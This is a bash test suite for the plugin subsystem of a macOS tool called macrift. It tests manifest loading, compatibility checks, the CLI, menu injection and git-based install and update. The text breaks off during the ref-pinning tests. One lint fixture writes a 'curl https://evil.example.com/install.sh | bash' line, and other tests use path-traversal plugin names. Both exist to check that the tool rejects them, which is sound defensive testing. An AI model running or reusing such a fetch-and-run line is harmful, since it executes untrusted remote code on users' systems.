#!/usr/bin/env bash
# macrift test suite — plain bash, no external deps (no bats/shfmt needed).
# Run: bash tests/run.sh
#
# Focus: the plugin subsystem — loader, `macrift plugin` CLI, management TUI,
# menu.parent injection, and end-to-end install/update/remove against a local
# git fixture. Plugins live in their own repos; the suite uses the minimal
# fixtures under tests/fixtures/ rather than any vendored copy.

# macrift requires bash 4+ (namerefs, associative arrays) and re-execs into it
# at runtime; the suite exercises that code, so it must run under bash 4+ too.
# macOS ships bash 3.2 as /bin/bash — re-exec into Homebrew bash when invoked
# under an older one (mirrors macrift.sh's guard).
if [[ "${BASH_VERSION%%.*}" -lt 4 ]]; then
    for _newer in /opt/homebrew/bin/bash /usr/local/bin/bash; do
        [[ -x "$_newer" ]] && exec "$_newer" "$0" "$@"
    done
    printf 'tests/run.sh requires bash 4+ (found %s) — run: brew install bash\n' "$BASH_VERSION" >&2
    exit 1
fi

set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export MACRIFT_DIR="$ROOT"
: "${HOME:=/tmp}"

pass=0 fail=0
ok() {
  pass=$((pass + 1))
  printf '  ok   %s\n' "$1"
}
no() {
  fail=$((fail + 1))
  printf '  FAIL %s\n' "$1"
  [[ -n "${2:-}" ]] && printf '         %s\n' "$2"
}
eq() { # name actual expected
  if [[ "$2" == "$3" ]]; then ok "$1"; else no "$1" "expected [$3] got [$2]"; fi
}

# == plugin loader (plugins.sh) ==
# Hermetic unit tests — mock common.sh helpers so we don't drag in its set -e
# + log-file side effects. _macrift_version_gt copied verbatim from common.sh.
printf '== plugin loader (plugins.sh) ==\n'
# Stubs emit just the message text (no styling) — tests grep stdout/stderr for it.
log_warn() { printf '%s\n' "${1:-}" >&2; }
log_err()  { printf '%s\n' "${1:-}" >&2; }
log_info() { printf '%s\n' "${1:-}"; }
log_ok()   { printf '%s\n' "${1:-}"; }
log_skip() { printf '%s\n' "${1:-}"; }
log_hint() { printf '%s\n' "${1:-}"; }
# Stub confirm — auto-yes unless MACRIFT_TEST_DENY=true forces a no. Real
# confirm reads /dev/tty (unreliable / unavailable in test runners).
confirm() {
    [[ "${MACRIFT_TEST_DENY:-}" == "true" ]] && return 1
    return 0
}
# shellcheck disable=SC2034  # read by plugins.sh after source
MACRIFT_VERSION="26.06"
# shellcheck disable=SC2034  # read by plugins.sh after source
MACRIFT_OS_VER="14.0"
_macrift_version_gt() {
  [[ "$1" == "$2" ]] && return 1
  local IFS=. i x y
  # shellcheck disable=SC2206
  local -a a=($1) b=($2)
  for ((i = 0; i < ${#a[@]} || i < ${#b[@]}; i++)); do
    x=${a[i]:-0}; y=${b[i]:-0}
    x=${x//[^0-9]/}; y=${y//[^0-9]/}
    ((10#${x:-0} > 10#${y:-0})) && return 0
    ((10#${x:-0} < 10#${y:-0})) && return 1
  done
  return 1
}
# shellcheck disable=SC1091
source "$ROOT/plugins.sh"

PT="$(mktemp -d)"
trap 'rm -rf "$PT"' EXIT
# shellcheck disable=SC2034  # read by plugins.sh after source
MACRIFT_PLUGINS_DIR="$PT"

# Helper to (re)write a plugin manifest
write_manifest() {
  local dir="$1"; shift
  mkdir -p "$dir"
  cat > "$dir/plugin.json" <<<"$*"
}

eq "discover empty when no plugin dirs" "$(_plugin_discover | wc -l | tr -d ' ')" "0"

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"Alpha","function":"alpha_menu"}}'
write_manifest "$PT/beta"  '{"name":"beta","version":"0.1.0","description":"b","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"Beta","function":"beta_menu"}}'
mkdir -p "$PT/orphan"  # no plugin.json → should be skipped

eq "discover finds 2 plugins, skips orphan dir" "$(_plugin_discover | wc -l | tr -d ' ')" "2"
eq "field .name reads correctly"  "$(_plugin_field "$PT/alpha" .name)"  "alpha"
eq "field .compat.macrift_api"    "$(_plugin_field "$PT/alpha" .compat.macrift_api)" "1"
if _plugin_field "$PT/alpha" .nope >/dev/null 2>&1; then no "missing field returns 1"; else ok "missing field returns 1"; fi

if _plugin_compat_ok "$PT/alpha"; then ok "valid plugin passes compat"; else no "valid plugin passes compat"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects future API";    else ok "rejects future API";    fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":0},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects older API";     else ok "rejects older API";     fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":"abc"},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects non-integer API"; else ok "rejects non-integer API"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"99.99","macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects too-new macrift_min"; else ok "rejects too-new macrift_min"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1,"macos_min":"99.0"},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects too-new macos_min"; else ok "rejects too-new macos_min"; fi

write_manifest "$PT/alpha" '{"version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects missing .name"; else ok "rejects missing .name"; fi

write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
if _plugin_compat_ok "$PT/alpha"; then no "rejects missing compat.macrift_min"; else ok "rejects missing compat.macrift_min"; fi

# == macrift plugin CLI ==
printf '== macrift plugin CLI ==\n'

# Reset to two valid plugins for list-rendering tests
write_manifest "$PT/alpha" '{"name":"alpha","version":"1.0.0","description":"alpha plugin","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"T","entry":"A","function":"a_menu"}}'
write_manifest "$PT/beta"  '{"name":"beta","version":"0.1.0","description":"beta plugin","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"T","entry":"B","function":"b_menu"}}'

# list — populated
out=$(_plugin_cli_list 2>&1)
if echo "$out" | grep -q "NAME.*VERSION.*STATUS.*DESCRIPTION"; then ok "list header has NAME/VERSION/STATUS/DESCRIPTION"; else no "list header"; fi
if echo "$out" | grep -q "alpha"; then ok "list shows alpha"; else no "list shows alpha"; fi
if echo "$out" | grep -q "beta"; then ok "list shows beta"; else no "list shows beta"; fi
if echo "$out" | grep -q "alpha plugin"; then ok "list shows description"; else no "list shows description"; fi
if echo "$out" | grep -q "^  alpha .* ok "; then ok "list marks compatible alpha as ok"; else no "compat status missing"; fi

# list — incompatible plugin shows as 'incompatible', not filtered out
write_manifest "$PT/future" '{"name":"future","version":"1.0.0","description":"f","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"T","entry":"F","function":"f_menu"}}'
out=$(_plugin_cli_list 2>&1)
if echo "$out" | grep -qE "^  future .* incompatible "; then ok "incompatible plugin shown with status"; else no "incompatible plugin missing status"; fi
rm -rf "${PT:?}"/future

# list — empty
rm -rf "${PT:?}"/*
out=$(_plugin_cli_list 2>&1)
if echo "$out" | grep -q "No plugins installed"; then ok "empty list says No plugins installed"; else no "empty list message"; fi

# dispatcher: default arg is list
out=$(_plugin_cli 2>&1)
if echo "$out" | grep -q "No plugins installed"; then ok "bare _plugin_cli defaults to list"; else no "bare _plugin_cli defaults to list"; fi

# dispatcher: help
out=$(_plugin_cli help 2>&1)
if echo "$out" | grep -q "Usage: macrift plugin"; then ok "help renders usage"; else no "help renders usage"; fi

# dispatcher: unknown subcommand
if _plugin_cli no-such 2>/dev/null; then no "unknown subcommand returns 1"; else ok "unknown subcommand returns 1"; fi

# == plugin TUI (management screen) ==
printf '== plugin TUI ==\n'
for _fn in plugins_menu _plugin_one_menu _plugin_add_menu _plugin_add_manual _plugin_catalog_entries; do
    if declare -F "$_fn" >/dev/null; then ok "TUI fn defined: $_fn"; else no "TUI fn defined: $_fn"; fi
done

# _plugin_catalog_entries parses a flat catalog scoped to a temp MACRIFT_DIR.
_cat_dir=$(mktemp -d)
cat > "$_cat_dir/catalog.json" <<'JSON'
{"version":1,"plugins":[
  {"name":"claudemac","source":"github.com/x/claudemac","tier":"official","description":"d"},
  {"name":"foo","source":"github.com/x/foo","tier":"official","description":"e"}
]}
JSON
( MACRIFT_DIR="$_cat_dir"
  cat_rows=$(_plugin_catalog_entries)
  all=$(printf '%s\n' "$cat_rows" | wc -l | tr -d ' ')
  first=$(printf '%s\n' "$cat_rows" | head -1)
  if [[ "$first" == $'claudemac\tgithub.com/x/claudemac\td' ]]; then ok "catalog: TSV is name/source/desc (no tier)"; else no "catalog: TSV is name/source/desc (no tier)" "got [$first]"; fi
  if [[ "$all" == "2" ]]; then ok "catalog: lists all entries"; else no "catalog: lists all entries" "got [$all]"; fi
)
# shellcheck disable=SC2030,SC2031  # MACRIFT_DIR override is intentionally subshell-local
( MACRIFT_DIR="$_cat_dir-missing"; out=$(_plugin_catalog_entries); if [[ -z "$out" ]]; then ok "catalog: missing file → empty"; else no "catalog: missing file → empty"; fi )
rm -rf "$_cat_dir"

# Shipped catalog.json is valid JSON and lists claudemac.
if jq -e '.plugins[] | select(.name=="claudemac")' "$ROOT/catalog.json" >/dev/null 2>&1; then
    ok "shipped catalog: lists claudemac"
else
    no "shipped catalog: lists claudemac"
fi

# == _plugin_load_all (auto-source + registry) ==
printf '== _plugin_load_all ==\n'

# Empty registry on a fresh dir
rm -rf "${PT:?}"/*
_plugin_load_all
eq "empty plugins dir → empty registry" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# One valid plugin → registry populated, function sourced
mkdir -p "$PT/alpha"
cat > "$PT/alpha/plugin.json" <<'JSON'
{"name":"alpha","version":"1.0.0","description":"a","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"Alpha","function":"alpha_menu"}}
JSON
cat > "$PT/alpha/menu.sh" <<'SH'
alpha_menu() { echo "alpha called"; }
SH

_plugin_load_all
eq "valid plugin: registry size"   "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"
eq "valid plugin: registry value"  "${MACRIFT_PLUGIN_REGISTRY[0]}"  $'s:Test\tAlpha\talpha_menu'
if declare -F alpha_menu >/dev/null; then ok "valid plugin: menu.sh sourced"; else no "valid plugin: menu.sh sourced"; fi

# Incompatible plugin → skipped
mkdir -p "$PT/future"
cat > "$PT/future/plugin.json" <<'JSON'
{"name":"future","version":"1.0.0","description":"f","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"Test","entry":"Future","function":"future_menu"}}
JSON
cat > "$PT/future/menu.sh" <<'SH'
future_menu() { :; }
SH

_plugin_load_all
# Registry should still be 1 (alpha only); 'future' filtered out
eq "incompatible plugin skipped (registry stays at 1)" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"

# Missing menu.sh → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/nomenu"
cat > "$PT/nomenu/plugin.json" <<'JSON'
{"name":"nomenu","version":"1.0.0","description":"n","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"N","function":"nomenu_menu"}}
JSON
# (no menu.sh)
_plugin_load_all
eq "missing menu.sh: plugin skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# menu.sh present but doesn't define the declared function → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/badfn"
cat > "$PT/badfn/plugin.json" <<'JSON'
{"name":"badfn","version":"1.0.0","description":"b","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Test","entry":"BadFn","function":"declared_but_missing"}}
JSON
cat > "$PT/badfn/menu.sh" <<'SH'
some_other_function() { :; }
SH
_plugin_load_all
eq "menu.sh missing declared function: plugin skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# Two plugins, same section — both in registry (grouping is render-time)
rm -rf "${PT:?}"/*
mkdir -p "$PT/p1" "$PT/p2"
cat > "$PT/p1/plugin.json" <<'JSON'
{"name":"p1","version":"1.0.0","description":"","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Same","entry":"P1","function":"p1_menu"}}
JSON
cat > "$PT/p1/menu.sh" <<'SH'
p1_menu() { :; }
SH
cat > "$PT/p2/plugin.json" <<'JSON'
{"name":"p2","version":"1.0.0","description":"","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"Same","entry":"P2","function":"p2_menu"}}
JSON
cat > "$PT/p2/menu.sh" <<'SH'
p2_menu() { :; }
SH
_plugin_load_all
eq "two plugins in same section: both registered" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "2"

# Idempotent re-load — calling twice should give same final state, not double
_plugin_load_all
eq "idempotent reload (no doubling)" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "2"

# Malicious .name (path traversal / non-kebab) → rejected, never registered
rm -rf "${PT:?}"/*
mkdir -p "$PT/evil"
cat > "$PT/evil/plugin.json" <<'JSON'
{"name":"../../../../tmp/evil","version":"1.0.0","description":"","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"evil_menu"}}
JSON
cat > "$PT/evil/menu.sh" <<'SH'
evil_menu() { :; }
SH
_plugin_load_all 2>/dev/null
eq "traversal .name: plugin skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# Missing jq → one clear warning, graceful return (PATH="" hides jq)
out=$(PATH="" _plugin_load_all 2>&1)
if grep -q "plugins require jq" <<<"$out"; then ok "missing jq: load_all warns and degrades"; else no "missing jq: load_all warns and degrades" "got [$out]"; fi
if PATH="" _plugin_cli list >/dev/null 2>&1; then no "missing jq: plugin CLI returns 1"; else ok "missing jq: plugin CLI returns 1"; fi


# == menu.parent (inject into built-in submenus) ==
printf '== menu.parent ==\n'

# parent-only manifest (valid enum) registers with parent set, section empty
rm -rf "${PT:?}"/*
mkdir -p "$PT/par"
cat > "$PT/par/plugin.json" <<'JSON'
{"name":"par","version":"1.0.0","description":"","compat":{"macrift_min":"26.06","macrift_api":1},"menu":{"parent":"customize","entry":"Par ›","function":"par_menu"}}
JSON
cat > "$PT/par/menu.sh" <<'SH'
par_menu() { :; }
SH
_plugin_load_all
eq "parent plugin: registry size" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"
eq "parent plugin: registry value" "${MACRIFT_PLUGIN_REGISTRY[0]}" $'p:customize\tPar ›\tpar_menu'

# both parent and section → mutually exclusive → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/both"
cat > "$PT/both/plugin.json" <<'JSON'
{"name":"both","version":"1.0.0","description":"","compat":{"macrift_min":"26.06","macrift_api":1},"menu":{"parent":"customize","section":"X","entry":"B","function":"both_menu"}}
JSON
cat > "$PT/both/menu.sh" <<'SH'
both_menu() { :; }
SH
_plugin_load_all 2>/dev/null
eq "parent+section both set: skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# neither parent nor section → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/none"
cat > "$PT/none/plugin.json" <<'JSON'
{"name":"none","version":"1.0.0","description":"","compat":{"macrift_min":"26.06","macrift_api":1},"menu":{"entry":"N","function":"none_menu"}}
JSON
cat > "$PT/none/menu.sh" <<'SH'
none_menu() { :; }
SH
_plugin_load_all 2>/dev/null
eq "neither parent nor section: skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# invalid parent enum value → skipped
rm -rf "${PT:?}"/*
mkdir -p "$PT/bad"
cat > "$PT/bad/plugin.json" <<'JSON'
{"name":"bad","version":"1.0.0","description":"","compat":{"macrift_min":"26.06","macrift_api":1},"menu":{"parent":"nosuch","entry":"B","function":"bad_menu"}}
JSON
cat > "$PT/bad/menu.sh" <<'SH'
bad_menu() { :; }
SH
_plugin_load_all 2>/dev/null
eq "invalid parent enum: skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"

# _menu_selectable_count — skips separators and headers
_msc_arr=("## Head" "One" "---" "Two" "## Other" "Three")
eq "_menu_selectable_count skips ---/## " "$(_menu_selectable_count _msc_arr)" "3"

# _plugin_attach_builtin — appends matching entries + a leading divider, populates funcs
rm -rf "${PT:?}"/*
mkdir -p "$PT/ax"
cat > "$PT/ax/plugin.json" <<'JSON'
{"name":"ax","version":"1.0.0","description":"","compat":{"macrift_min":"26.06","macrift_api":1},"menu":{"parent":"cleanup","entry":"AxEntry","function":"ax_menu"}}
JSON
cat > "$PT/ax/menu.sh" <<'SH'
ax_menu() { :; }
SH
_plugin_load_all
_ab_items=("Built-in One" "Built-in Two")
_ab_funcs=()
_plugin_attach_builtin cleanup _ab_items _ab_funcs
eq "_plugin_attach_builtin: divider prepended" "${_ab_items[2]}" "---"
eq "_plugin_attach_builtin: entry appended"    "${_ab_items[3]}" "AxEntry"
eq "_plugin_attach_builtin: func recorded"     "${_ab_funcs[0]}" "ax_menu"
# no match for a different slug → no-op, funcs empty
_ab_items2=("Only")
_ab_funcs2=(stale)
_plugin_attach_builtin tweaks _ab_items2 _ab_funcs2
eq "_plugin_attach_builtin: no match → items untouched" "${#_ab_items2[@]}" "1"
eq "_plugin_attach_builtin: no match → funcs empty" "${#_ab_funcs2[@]}" "0"


# == sample plugin (end-to-end loader against a fixture tree) ==
# The minimal-viable plugin — manifest + a single menu function, parent=customize.
if [[ -d "$ROOT/tests/fixtures/sample-plugin" ]]; then
    printf '== sample-plugin (fixture) ==\n'
    if jq . "$ROOT/tests/fixtures/sample-plugin/plugin.json" >/dev/null 2>&1; then
        ok "sample-plugin plugin.json valid"
    else
        no "sample-plugin plugin.json valid"
    fi
    eq "name kebab-case" \
       "$(jq -r .name "$ROOT/tests/fixtures/sample-plugin/plugin.json" | grep -cE '^[a-z][a-z0-9-]*[a-z0-9]$')" "1"
    eq "version is semver" \
       "$(jq -r .version "$ROOT/tests/fixtures/sample-plugin/plugin.json" | grep -cE '^[0-9]+\.[0-9]+\.[0-9]+')" "1"
    eq "menu.function names a valid bash identifier" \
       "$(jq -r .menu.function "$ROOT/tests/fixtures/sample-plugin/plugin.json" | grep -cE '^[a-zA-Z_][a-zA-Z0-9_]*$')" "1"

    SBX2="$(mktemp -d)"
    ln -sf "$ROOT/tests/fixtures/sample-plugin" "$SBX2/sample-plugin"
    saved_dir2="$MACRIFT_PLUGINS_DIR"
    MACRIFT_PLUGINS_DIR="$SBX2"
    _plugin_load_all 2>/dev/null
    eq "sample-plugin registered" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "1"
    if declare -F sample_plugin_menu >/dev/null; then
        ok "sample_plugin_menu function defined"
    else
        no "sample_plugin_menu function defined"
    fi
    eq "sample-plugin targets parent=customize" \
       "$(IFS=$'\t'; read -r t _ _ <<<"${MACRIFT_PLUGIN_REGISTRY[0]}"; printf '%s' "$t")" \
       "p:customize"
    rm -rf "$SBX2"
    MACRIFT_PLUGINS_DIR="$saved_dir2"
fi

# == multi-plugin scenario (both fixtures load together) ==
if [[ -d "$ROOT/tests/fixtures/sample-plugin" && -d "$ROOT/tests/fixtures/other-plugin" ]]; then
    printf '== multi-plugin (fixtures as plugins dir) ==\n'
    saved_dir3="$MACRIFT_PLUGINS_DIR"
    MACRIFT_PLUGINS_DIR="$ROOT/tests/fixtures"
    _plugin_load_all 2>/dev/null
    eq "both plugins register" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "2"
    # Order is filesystem-alphabetical: other-plugin < sample-plugin
    eq "first registered is other-plugin" \
       "$(IFS=$'\t'; read -r _ _ f <<<"${MACRIFT_PLUGIN_REGISTRY[0]}"; printf '%s' "$f")" \
       "other_plugin_menu"
    eq "second registered is sample-plugin" \
       "$(IFS=$'\t'; read -r _ _ f <<<"${MACRIFT_PLUGIN_REGISTRY[1]}"; printf '%s' "$f")" \
       "sample_plugin_menu"
    MACRIFT_PLUGINS_DIR="$saved_dir3"
fi


# == plugin add / remove / update / info / lint (end-to-end on a local git fixture) ==
if command -v git >/dev/null 2>&1; then
    printf '== plugin CLI (add/remove/update/info/lint) ==\n'

    # Build a local git repo from the sample-plugin fixture so we can test the
    # add CLI without network.
    FX_REPO="$(mktemp -d)/sample-plugin"
    cp -R "$ROOT/tests/fixtures/sample-plugin" "$FX_REPO"
    ( cd "$FX_REPO" \
      && git init -q \
      && git config user.email "test@local" \
      && git config user.name "test" \
      && git add -A \
      && git commit -q -m "init sample-plugin 1.0.0" \
      && git tag v1.0.0 ) || no "fixture repo setup"

    # Sandbox $HOME-ish env for the CLI commands
    CLI_SBX="$(mktemp -d)"
    saved_pd="$MACRIFT_PLUGINS_DIR"
    saved_lk="${MACRIFT_PLUGINS_LOCK:-}"
    MACRIFT_PLUGINS_DIR="$CLI_SBX/plugins"
    MACRIFT_PLUGINS_LOCK="$CLI_SBX/plugins.lock.json"
    export MACRIFT_NO_CONFIRM=true

    # --- add (no @ref so HEAD stays on a tracking branch — needed for update tests) ---
    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1
    if [[ -d "$MACRIFT_PLUGINS_DIR/sample-plugin" ]]; then
        ok "plugin add installs the plugin tree"
    else
        no "plugin add installs the plugin tree"
    fi
    eq "lockfile records the install"   "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "1"
    eq "lockfile has source"            "$(jq -r '.plugins."sample-plugin".source' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null | grep -c 'sample-plugin')" "1"
    eq "lockfile has commit"            "$(jq -r '.plugins."sample-plugin".commit' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null | wc -c | tr -d ' ')" "41"  # 40 hex + newline

    # --- add again with denied confirm — must NOT overwrite the install ---
    pre_install_at=$(jq -r '.plugins."sample-plugin".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
    MACRIFT_TEST_DENY=true
    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1 || true
    MACRIFT_TEST_DENY=""
    post_install_at=$(jq -r '.plugins."sample-plugin".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
    eq "collision: declined confirm leaves install untouched" "$pre_install_at" "$post_install_at"

    # --- overwrite confirmed, final install declined — backup restored, not lost ---
    touch "$MACRIFT_PLUGINS_DIR/sample-plugin/.orig-marker"
    confirm() { [[ "${1:-}" == Install* ]] && return 1; return 0; }
    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1 || true
    confirm() { [[ "${MACRIFT_TEST_DENY:-}" == "true" ]] && return 1; return 0; }
    if [[ -f "$MACRIFT_PLUGINS_DIR/sample-plugin/.orig-marker" ]]; then
        ok "overwrite then cancel: original install restored"
    else
        no "overwrite then cancel: original install restored"
    fi
    if compgen -G "$MACRIFT_PLUGINS_DIR/sample-plugin.bak.*" >/dev/null; then
        no "overwrite then cancel: no stray backup left"
    else
        ok "overwrite then cancel: no stray backup left"
    fi

    # --- successful overwrite cleans up its backup ---
    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1
    if compgen -G "$MACRIFT_PLUGINS_DIR/sample-plugin.bak.*" >/dev/null; then
        no "overwrite success: backup removed"
    else
        ok "overwrite success: backup removed"
    fi

    # --- info ---
    info_out=$(_plugin_cli_info sample-plugin 2>&1)
    if echo "$info_out" | grep -q "sample-plugin 1.0.0"; then ok "info: name + version"; else no "info: name + version"; fi
    if echo "$info_out" | grep -q "Status:    ok"; then ok "info: status ok"; else no "info: status ok"; fi
    if echo "$info_out" | grep -q "Source:"; then ok "info: source line"; else no "info: source line"; fi
    if echo "$info_out" | grep -q "Commit:"; then ok "info: commit line"; else no "info: commit line"; fi
    if echo "$info_out" | grep -q "Lint:      clean"; then ok "info: lint clean line"; else no "info: lint clean line"; fi

    if _plugin_cli_info no-such-plugin >/dev/null 2>&1; then
        no "info on nonexistent plugin should return 1"
    else
        ok "info on nonexistent plugin returns 1"
    fi

    # --- info shows the actual incompat reason ---
    mkdir -p "$MACRIFT_PLUGINS_DIR/futcli"
    cat > "$MACRIFT_PLUGINS_DIR/futcli/plugin.json" <<'JSON'
{"name":"futcli","version":"1.0.0","description":"f","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"X","entry":"F","function":"f_menu"}}
JSON
    fut_out=$(_plugin_cli_info futcli 2>&1)
    if echo "$fut_out" | grep -q "Status:    incompatible"; then ok "info: incompatible status"; else no "info: incompatible status"; fi
    if echo "$fut_out" | grep -q "needs macrift API v99"; then ok "info: incompat reason shown inline"; else no "info: incompat reason shown inline" "got [$fut_out]"; fi
    rm -rf "$MACRIFT_PLUGINS_DIR/futcli"

    # --- lint ---
    if _plugin_cli_lint sample-plugin >/dev/null 2>&1; then
        ok "lint clean on a well-formed plugin"
    else
        no "lint clean on a well-formed plugin"
    fi

    # --- lint catches bad patterns ---
    BAD_DIR="$CLI_SBX/bad-plugin"
    mkdir -p "$BAD_DIR"
    cat > "$BAD_DIR/plugin.json" <<'JSON'
{"name":"bad","version":"1.0.0","description":"bad","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"B","function":"b_menu"}}
JSON
    cat > "$BAD_DIR/menu.sh" <<'SH'
b_menu() {
    defaults write com.test.bad TheKey -bool true
    if ! launchctl bootstrap gui/501 /tmp/bad.plist; then :; fi
    # launchctl bootstrap mentioned in a comment only
    curl https://evil.example.com/install.sh | bash
}
SH
    lint_out=$(_plugin_cli_lint "$BAD_DIR" 2>&1)
    if echo "$lint_out" | grep -q "defaults write"; then ok "lint flags raw 'defaults write'"; else no "lint flags raw 'defaults write'"; fi
    if echo "$lint_out" | grep -q "if ! launchctl bootstrap"; then ok "lint flags mid-line 'launchctl bootstrap'"; else no "lint flags mid-line 'launchctl bootstrap'"; fi
    if echo "$lint_out" | grep -q "mentioned in a comment"; then no "lint skips comment-only lines"; else ok "lint skips comment-only lines"; fi
    if echo "$lint_out" | grep -q "curl"; then ok "lint flags 'curl | bash'"; else no "lint flags 'curl | bash'"; fi

    # --- update (idempotent — nothing changed upstream) ---
    pre_head=$(git -C "$MACRIFT_PLUGINS_DIR/sample-plugin" rev-parse HEAD 2>/dev/null || echo "?")
    if _plugin_cli_update sample-plugin >/dev/null 2>&1; then ok "update: idempotent returns 0"; else no "update: idempotent returns 0"; fi
    post_head=$(git -C "$MACRIFT_PLUGINS_DIR/sample-plugin" rev-parse HEAD 2>/dev/null || echo "?")
    eq "update: idempotent leaves HEAD unchanged" "$pre_head" "$post_head"

    # --- update after upstream advances ---
    ( cd "$FX_REPO" \
      && echo "# extra" >> README.md \
      && git add README.md \
      && git commit -q -m "extra commit" ) || no "fixture upstream advance"
    pre_head=$(git -C "$MACRIFT_PLUGINS_DIR/sample-plugin" rev-parse HEAD 2>/dev/null || echo "?")
    _plugin_cli_update sample-plugin >/dev/null 2>&1 || true
    post_head=$(git -C "$MACRIFT_PLUGINS_DIR/sample-plugin" rev-parse HEAD 2>/dev/null || echo "?")
    if [[ "$pre_head" != "$post_head" ]]; then ok "update pulls a new commit"; else no "update pulls a new commit"; fi

    # --- remove ---
    _plugin_cli_remove sample-plugin >/dev/null 2>&1
    if [[ ! -e "$MACRIFT_PLUGINS_DIR/sample-plugin" ]]; then
        ok "remove deletes the plugin tree"
    else
        no "remove deletes the plugin tree"
    fi
    eq "lockfile entry removed" "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "0"

    if _plugin_cli_remove sample-plugin >/dev/null 2>&1; then
        no "remove on missing plugin should fail"
    else
        ok "remove on missing plugin fails"
    fi

    # --- traversal names rejected before any path is built ---
    if _plugin_cli_remove "../evil" >/dev/null 2>&1; then no "remove: rejects traversal name"; else ok "remove: rejects traversal name"; fi
    if _plugin_cli_info "../../etc" >/dev/null 2>&1; then no "info: rejects traversal name"; else ok "info: rejects traversal name"; fi
    if _plugin_cli_lint "no/such-name" >/dev/null 2>&1; then no "lint: rejects traversal name"; else ok "lint: rejects traversal name"; fi
    if _plugin_cli_update "../evil" >/dev/null 2>&1; then no "update: rejects traversal name"; else ok "update: rejects traversal name"; fi

    # --- _plugin_normalize_source unit checks ---
    eq "normalize github.com/x/y"  "$(_plugin_normalize_source 'github.com/x/y')" "https://github.com/x/y"
    eq "normalize https URL"       "$(_plugin_normalize_source 'https://example.com/x.git')" "https://example.com/x.git"
    eq "normalize file://"         "$(_plugin_normalize_source 'file:///abs/path')" "file:///abs/path"
    eq "normalize ssh user@host"   "$(_plugin_normalize_source 'git@github.com:x/y.git')" "git@github.com:x/y.git"
    eq "normalize absolute path"   "$(_plugin_normalize_source '/abs/path')" "/abs/path"
    if _plugin_normalize_source 'random-garbage' >/dev/null 2>&1; then
        no "normalize rejects unknown form"
    else
        ok "normalize rejects unknown form"
    fi

    # --- @ref ref-handling (separate install — pinned checkouts skip 'update') ---
    add_out=$(_plugin_cli_add "file://$FX_REPO@v1.0.0" 2>&1)
    eq "lockfile records ref when @ref given" \
       "$(jq -r '.plugins."sample-plugin".ref' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" \
       "v1.0.0"
    if echo "$add_out" | grep -q "Menu entries:"; then ok "add summary: menu entries section"; else no "add summary: menu entries section"; fi
